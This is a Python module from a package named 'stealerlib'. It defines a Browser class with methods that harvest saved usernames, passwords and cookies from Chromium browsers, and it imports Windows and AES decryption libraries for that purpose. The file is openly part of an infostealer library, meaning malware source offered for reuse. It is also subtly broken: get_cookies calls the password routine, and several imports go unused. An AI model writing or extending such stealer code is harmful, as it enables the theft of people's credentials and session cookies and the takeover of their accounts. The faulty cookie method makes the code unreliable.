#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/__init__.py
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
import win32crypt

from Cryptodome.Cipher import AES

from stealerlib.exceptions import catch
from stealerlib.browser.chrome import Chrome


class Browser(Chrome):

    def __init__(self):
        Chrome.__init__(self)

    def get_passwords(self, type="all") -> list[tuple[str, ...]]:
        """Gets the saved userames and passwords for the specific browser type (default=all)

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect cookies from

        Returns:
            list[tuple[str, ...]]: List of (username, password) tuples

        Example:
            browser = Browser()
            browser.get_passwords()
        """

        if type == "chromium":
            passwords = self.get_passwords_chromium()
        else:
            passwords = self.get_passwords_chromium()
            # add other browsers here

        return passwords

    def get_cookies(self, type="all") -> list[tuple[str, ...]]:
        """Gets the saved cookies for the specific browser type (default=all)

        Parameters:
            self (object): The object passed to the method
            type (str): Browser type to collect cookies from

        Returns:
            list[str]: List of browser cookies

        Example:
            browser = Browser()
            browser.get_cookies()
        """

        if type == "chromium":
            cookies = self.get_passwords_chromium()
        else:
            cookies = self.get_passwords_chromium()
            # add other browsers here

        return cookies